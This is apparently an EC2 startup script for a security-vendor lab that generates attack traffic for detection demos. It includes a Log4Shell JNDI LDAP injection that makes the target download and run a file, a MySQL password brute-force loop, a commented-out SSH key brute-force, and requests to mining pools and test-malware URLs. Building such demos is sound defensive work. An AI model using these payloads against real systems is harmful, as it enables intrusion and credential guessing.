#!/bin/bash

exec > >(tee /var/log/user-data.log|logger -t user-data -s 2>/dev/console) 2>&1

# Update hostname for better identification
sudo hostname att-app-server

# Updating yum repositories
sudo yum update -y

# Installing Docker
sudo amazon-linux-extras install docker -y


# Starting Docker
sudo service docker start
sudo systemctl enable docker
sudo usermod -a -G docker ec2-user
sudo docker info

# Preparing the launch_attack script
ATTACK_URL='X-Api-Version: ${jndi:ldap://att-svr:1389/Basic/Command/Base64/d2dldCBodHRwOi8vd2lsZGZpcmUucGFsb2FsdG9uZXR3b3Jrcy5jb20vcHVibGljYXBpL3Rlc3QvZWxmIC1PIC90bXAvbWFsd2FyZS1zYW1wbGUK}'
ATTACK_COMMAND="curl 10.1.1.100:8080 -H '${ATTACK_URL}'"
sudo echo "${ATTACK_COMMAND}" >> /tmp/launch_log4j_attack.sh
sudo chmod 777 /tmp/launch_attack.sh

# Downloading and Running the Attack App Server Demo App
sudo docker container run -itd --rm --name att-svr -p 8888:8888 -p 1389:1389 us.gcr.io/panw-gcp-team-testing/qwiklab/pcc-log4shell/l4s-demo-svr:1.0

## Setting up other things.
yum install git -y
pip3 install paramiko
if [ ! -f /home/ec2-user/users ]; then
    cat << EOH > /home/ec2-user/users
ec2-user
root
admin
administrator
ftp
www
nobody
EOH
fi   

## download_malware.sh
cat << EOH > /tmp/download_malware.sh
echo -e "Downloading Malware ...\n"
curl -s wget https://secure.eicar.org/eicar.com.txt" > /dev/null &
curl -s http://urlfiltering.paloaltonetworks.com/test-malware  > /dev/null &
EOH

## launch_mysql_attack.sh
cat << EOH > /tmp/mysql_attack.sh
echo -e "Running Mysql Attack...\n"
DB_IP_ADDRESS="10.1.1.100"
for i in {1..250}; do
    mysql -u user1 -h $DB_IP_ADDRESS -pwrong demo
    sleep .1 
done
EOH

## launch_ssh_attack.sh
# cat << EOH > /tmp/launch_ssh_attack.sh
# VULN_IP_ADDRESS="10.1.1.100"
# ssh -o StrictHostKeyChecking=no -o ConnectTimeout=2 root@$VULN_IP_ADDRESS
# for j in `seq 1 5`; do python3 /home/ec2-user/crowbar/crowbar.py -b sshkey -s $VULN_IP_ADDRESS/32 -U /home/ec2-user/users -k /home/ec2-user/compromised_keys; done
# EOH

cat << EOH > /tmp/launch_crypto_mining.sh
echo -e "Crypto Currency Mining Activity...\n"
curl -s https://www.buybitcoinworldwide.com/mining/pools/ > /dev/null &
curl -s http://pool.minergate.com/dkjdjkjdlsajdkljalsskajdksakjdksajkllalkdjsalkjdsalkjdlkasj  > /dev/null &
curl -s http://xmr.pool.minergate.com/dhdhjkhdjkhdjkhajkhdjskahhjkhjkahdsjkakjasdhkjahdjk  > /dev/null &
EOH

cat << EOH > /tmp/launch_windows_executable.sh
echo -e "Inline ML - Windows Executables Test File Detection...\n"
curl -s http://wildfire.paloaltonetworks.com/publicapi/test/pe > /dev/null &
curl -s http://wildfire.paloaltonetworks.com/publicapi/test/pe > /dev/null &
EOH

cat << EOH > /tmp/launch_js_phishing.sh
echo -e "Inline ML - Javascript Exploit & Phishing Detection...\n"
curl -s http://mlav.testpanw.com/js.html > /dev/null &
curl -s http://mlav.testpanw.com/phishing.html > /dev/null &
curl -s http://urlfiltering.paloaltonetworks.com/test-phishing > /dev/null &
EOH